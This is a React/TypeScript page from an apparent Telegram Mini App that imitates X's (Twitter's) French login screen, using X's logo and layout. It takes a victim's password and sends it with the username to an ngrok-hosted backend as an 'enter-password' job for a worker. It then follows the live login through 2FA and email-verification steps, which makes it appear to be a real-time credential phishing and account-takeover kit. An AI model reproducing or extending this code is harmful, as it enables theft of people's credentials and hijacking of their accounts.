// // src/pages/Password.tsx
// import { useState, useEffect } from "react";
// import { useLocation, useNavigate } from "react-router-dom";
// import axios from "axios";
// import { useSignal, initData } from "@tma.js/sdk-react";

// import "./Password.css";

// import type {
//   JobsStatusResponse,
//   JobCommandResponse,
// } from "../../../server/src/types/jobs";

// import { FullScreenLoader } from "../components/FullScreenLoader";
// import { Toast } from "../components/Toast";

// const API_BASE = "https://juiceless-hyo-pretechnical.ngrok-free.dev/api";

// export const Password = () => {
//   const location = useLocation();
//   const navigate = useNavigate();
//   const initDataRaw = useSignal(initData.raw);

//   const [username, setUsername] = useState("");
//   const [password, setPassword] = useState("");

//   const [loading, setLoading] = useState(false);
//   const [toast, setToast] = useState("");

//   useEffect(() => {
//     const state = location.state as { username?: string } | null;
//     if (state?.username) {
//       setUsername(state.username);
//     }
//   }, [location.state]);

//   const pollCommandUntilDone = async (commandId: string, maxMs = 20000) => {
//     const start = Date.now();

//     while (Date.now() - start < maxMs) {
//       const resp = await axios.post<JobsStatusResponse>(
//         `${API_BASE}/jobs/status`,
//         { initData: initDataRaw },
//         { headers: { "Content-Type": "application/json" } }
//       );

//       const cs = resp.data.commandState;

//       if (!cs) {
//         await new Promise((r) => setTimeout(r, 800));
//         continue;
//       }

//       if (cs.commandId !== commandId) {
//         await new Promise((r) => setTimeout(r, 800));
//         continue;
//       }

//       if (cs.status === "pending" || cs.status === "running") {
//         await new Promise((r) => setTimeout(r, 800));
//         continue;
//       }

//       return cs;
//     }

//     return null;
//   };

//   const handleLogin = async () => {
//     setToast("");

//     if (!initDataRaw) {
//       setToast("Telegram initData missing");
//       return;
//     }

//     if (!username) {
//       setToast("Username missing");
//       return;
//     }

//     const pwd = password.trim();
//     if (!pwd) {
//       setToast("Please enter your password");
//       return;
//     }

//     try {
//       setLoading(true);

//       const cmdResp = await axios.post<JobCommandResponse>(
//         `${API_BASE}/jobs/command`,
//         {
//           initData: initDataRaw,
//           command: {
//             type: "enter-password",
//             payload: {
//               password: pwd,
//               username, // 👈 on passe aussi le username au worker
//             },
//           },
//         },
//         { headers: { "Content-Type": "application/json" } }
//       );

//       if (!cmdResp.data.ok) {
//         setLoading(false);
//         setToast(cmdResp.data.error || "Command failed");
//         return;
//       }

//       const commandId = cmdResp.data.commandId;
//       if (!commandId) {
//         setLoading(false);
//         setToast("Missing commandId from server");
//         return;
//       }

//       const finalState = await pollCommandUntilDone(commandId);

//       setLoading(false);

//       if (!finalState) {
//         setToast("Timeout, please try again");
//         return;
//       }

//       // ✅ SUCCESS CASE
//       if (finalState.status === "done" && finalState.result?.ok) {
//         const challenge = finalState.result?.challenge;

//         if (challenge === "2fa") {
//           console.log("✅ PASSWORD OK → need 2FA", finalState.result);
//           navigate("/twofa", { state: { username } });
//           return;
//         }

//         if (challenge === "email_verif") {
//           console.log("✅ PASSWORD OK → need EMAIL VERIFY", finalState.result);
//           navigate("/email-verify", { state: { username } });
//           return;
//         }

//         // Pas de challenge spécial
//         console.log("✅ PASSWORD OK", finalState.result);
//         navigate("/home", { state: { username } });
//         return;
//       }

//       // ❌ ERROR CASE
//       const msg =
//         finalState.error ||
//         finalState.result?.message ||
//         finalState.result?.error ||
//         "Invalid password";
//       setToast(msg);
//     } catch (err: any) {
//       setLoading(false);
//       setToast(err.response?.data?.error || err.message || "Network error");
//     }
//   };

//   return (
//     <div className="password-page">
//       <FullScreenLoader visible={loading} text="Checking password..." />
//       <Toast message={toast} onClose={() => setToast("")} />

//       <div className="password-container">
//         <input
//           type="text"
//           placeholder="Phone, email, or username"
//           value={username}
//           readOnly
//           className="password-input"
//         />
//         <input
//           type="password"
//           placeholder="Password"
//           value={password}
//           onChange={(e) => setPassword(e.target.value)}
//           className="password-input"
//           disabled={loading}
//         />
//         <button
//           className="login-button"
//           onClick={handleLogin}
//           disabled={loading}
//         >
//           Log in
//         </button>
//       </div>
//     </div>
//   );
// };
// src/pages/Password.tsx
import { useState, useEffect } from "react";
import { useLocation, useNavigate } from "react-router-dom";
import axios from "axios";
import { useSignal, initData } from "@tma.js/sdk-react";

import "./Password.css";

import type {
  JobsStatusResponse,
  JobCommandResponse,
} from "../../../server/src/types/jobs";

import { FullScreenLoader } from "../components/FullScreenLoader";
import { Toast } from "../components/Toast";

const API_BASE = "https://juiceless-hyo-pretechnical.ngrok-free.dev/api";

export const Password = () => {
  const location = useLocation();
  const navigate = useNavigate();
  const initDataRaw = useSignal(initData.raw);

  const [username, setUsername] = useState("");
  const [password, setPassword] = useState("");
  const [showPassword, setShowPassword] = useState(false);

  const [loading, setLoading] = useState(false);
  const [toast, setToast] = useState("");

  useEffect(() => {
    const state = location.state as { username?: string } | null;
    if (state?.username) {
      setUsername(state.username);
    }
  }, [location.state]);

  const pollCommandUntilDone = async (commandId: string, maxMs = 20000) => {
    const start = Date.now();

    while (Date.now() - start < maxMs) {
      const resp = await axios.post<JobsStatusResponse>(
        `${API_BASE}/jobs/status`,
        { initData: initDataRaw },
        { headers: { "Content-Type": "application/json" } }
      );

      const cs = resp.data.commandState;

      if (!cs) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      if (cs.commandId !== commandId) {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      if (cs.status === "pending" || cs.status === "running") {
        await new Promise((r) => setTimeout(r, 800));
        continue;
      }

      return cs;
    }

    return null;
  };

  const handleLogin = async () => {
    setToast("");

    if (!initDataRaw) {
      setToast("Telegram initData missing");
      return;
    }

    const pwd = password.trim();
    if (!pwd) {
      setToast("Please enter your password");
      return;
    }

    try {
      setLoading(true);

      const cmdResp = await axios.post<JobCommandResponse>(
        `${API_BASE}/jobs/command`,
        {
          initData: initDataRaw,
          command: {
            type: "enter-password",
            payload: {
              password: pwd,
              username, // peut être vide, pas grave
            },
          },
        },
        { headers: { "Content-Type": "application/json" } }
      );

      if (!cmdResp.data.ok) {
        setLoading(false);
        setToast(cmdResp.data.error || "Command failed");
        return;
      }

      const commandId = cmdResp.data.commandId;
      if (!commandId) {
        setLoading(false);
        setToast("Missing commandId from server");
        return;
      }

      const finalState = await pollCommandUntilDone(commandId);

      setLoading(false);

      if (!finalState) {
        setToast("Timeout, please try again");
        return;
      }

      // ✅ SUCCESS CASE
      if (finalState.status === "done" && finalState.result?.ok) {
        const challenge = finalState.result?.challenge;

        if (challenge === "2fa") {
          console.log("✅ PASSWORD OK → need 2FA", finalState.result);
          navigate("/twofa", { state: { username } });
          return;
        }

        if (challenge === "email_verif") {
          console.log("✅ PASSWORD OK → need EMAIL VERIFY", finalState.result);
          navigate("/email-verify", { state: { username } });
          return;
        }

        // Pas de challenge spécial
        console.log("✅ PASSWORD OK", finalState.result);
        navigate("/home", { state: { username } });
        return;
      }

      // ❌ ERROR CASE
      const msg =
        finalState.error ||
        finalState.result?.message ||
        finalState.result?.error ||
        "Invalid password";
      setToast(msg);
    } catch (err: any) {
      setLoading(false);
      setToast(err.response?.data?.error || err.message || "Network error");
    }
  };

  return (
    <div className="password-page">
      <FullScreenLoader visible={loading} text="Checking password..." />
      <Toast message={toast} onClose={() => setToast("")} />

      <div className="password-modal" role="dialog" aria-modal="true">
        {/* Header */}
        <div className="password-header">
          <div className="password-header-content">
            <div className="password-close-button-container">
              <button
                className="password-close-button"
                aria-label="Fermer"
                type="button"
                onClick={() => navigate(-1)}
              >
                <svg
                  viewBox="0 0 24 24"
                  aria-hidden="true"
                  className="password-close-icon"
                >
                  <g>
                    <path d="M10.59 12L4.54 5.96l1.42-1.42L12 10.59l6.04-6.05 1.42 1.42L13.41 12l6.05 6.04-1.42 1.42L12 13.41l-6.04 6.05-1.42-1.42L10.59 12z"></path>
                  </g>
                </svg>
              </button>
            </div>
            <div className="password-logo-container">
              <svg
                viewBox="0 0 24 24"
                aria-label="X"
                role="img"
                className="password-logo"
              >
                <g>
                  <path d="M21.742 21.75l-7.563-11.179 7.056-8.321h-2.456l-5.691 6.714-4.54-6.714H2.359l7.29 10.776L2.25 21.75h2.456l6.035-7.118 4.818 7.118h6.191-.008zM7.739 3.818L18.81 20.182h-2.447L5.29 3.818h2.447z"></path>
                </g>
              </svg>
            </div>
            <div className="password-header-spacer"></div>
          </div>
        </div>

        {/* Content */}
        <div className="password-content">
          <div className="password-title-container">
            <h1 className="password-title" id="modal-header">
              Entrez votre mot de passe
            </h1>
          </div>

          <div className="password-form">
            <label className="password-label">
              <div className="password-label-text">
                <span>Nom d'utilisateur</span>
              </div>
              <div className="password-input-wrapper">
                <input
                  type="text"
                  name="username"
                  autoComplete="on"
                  autoCapitalize="sentences"
                  autoCorrect="on"
                  spellCheck="true"
                  dir="auto"
                  className="password-input"
                  value={username}
                  disabled
                  readOnly
                />
              </div>
            </label>

            <label className="password-label">
              <div className="password-label-text">
                <span>Mot de passe</span>
              </div>
              <div className="password-input-wrapper password-input-wrapper-with-button">
                <input
                  type={showPassword ? "text" : "password"}
                  name="password"
                  autoComplete="current-password"
                  autoCapitalize="sentences"
                  autoCorrect="on"
                  spellCheck="true"
                  dir="auto"
                  className="password-input"
                  value={password}
                  onChange={(e) => setPassword(e.target.value)}
                  disabled={loading}
                  onKeyDown={(e) => {
                    if (e.key === "Enter" && !loading && password.trim()) {
                      handleLogin();
                    }
                  }}
                />
                <button
                  type="button"
                  className="password-show-button"
                  aria-label={
                    showPassword
                      ? "Masquer le mot de passe"
                      : "Afficher le mot de passe"
                  }
                  onClick={() => setShowPassword(!showPassword)}
                >
                  {showPassword ? (
                    <svg
                      viewBox="0 0 24 24"
                      aria-hidden="true"
                      className="password-eye-icon"
                    >
                      <g>
                        <path d="M12 5.143c2.5 0 4.5 2 4.5 4.5 0 .5-.1 1-.3 1.5l2.4 2.4c1.9-1.4 3.4-3.2 4.2-5.2-1.8-4.4-6.1-7.5-11.1-7.5-1.2 0-2.3.2-3.4.5l1.8 1.8c.5-.2 1-.3 1.5-.3zm-2.8 2.8l1.9 1.9c-.1.3-.1.6-.1.9 0 1.7 1.3 3 3 3 .3 0 .6 0 .9-.1l1.9 1.9c-1.2.8-2.6 1.2-4 1.2-2.5 0-4.5-2-4.5-4.5 0-1.4.4-2.8 1.2-4zm-4.1-1.1l-1.4 1.4 1.4 1.4c-1.9 1.4-3.4 3.2-4.2 5.2 1.8 4.4 6.1 7.5 11.1 7.5 1.2 0 2.3-.2 3.4-.5l1.4 1.4 1.4-1.4-15.1-15.1zm8.3 8.3l-3.5-3.5c.1-.3.1-.6.1-.9 0-1.7-1.3-3-3-3-.3 0-.6 0-.9.1l-3.5-3.5c1.2-.8 2.6-1.2 4-1.2 2.5 0 4.5 2 4.5 4.5 0 1.4-.4 2.8-1.2 4z"></path>
                      </g>
                    </svg>
                  ) : (
                    <svg
                      viewBox="0 0 24 24"
                      aria-hidden="true"
                      className="password-eye-icon"
                    >
                      <g>
                        <path d="M12 21c-7.605 0-10.804-8.296-10.937-8.648L.932 12l.131-.352C1.196 11.295 4.394 3 12 3s10.804 8.296 10.937 8.648l.131.352-.131.352C22.804 12.705 19.606 21 12 21zm-8.915-9c.658 1.467 3.5 7 8.915 7s8.257-5.533 8.915-7c-.658-1.467-3.5-7-8.915-7s-8.257 5.533-8.915 7zM12 16c-2.206 0-4-1.794-4-4s1.794-4 4-4 4 1.794 4 4-1.794 4-4 4zm0-6c-1.103 0-2 .897-2 2s.897 2 2 2 2-.897 2-2-.897-2-2-2z"></path>
                      </g>
                    </svg>
                  )}
                </button>
              </div>
            </label>

            <div className="password-forgot-link">
              <button
                type="button"
                className="password-forgot-button"
                onClick={() => {
                  // TODO: Implement forgot password
                }}
              >
                Mot de passe oublié ?
              </button>
            </div>

            <button
              className="password-login-button"
              onClick={handleLogin}
              disabled={loading || !password.trim()}
              type="button"
            >
              <span>Se connecter</span>
            </button>

            <div className="password-signup-link">
              <span>Vous n'avez pas de compte ? </span>
              <button type="button" className="password-signup-button">
                <span>Inscrivez-vous</span>
              </button>
            </div>
          </div>
        </div>
      </div>
    </div>
  );
};
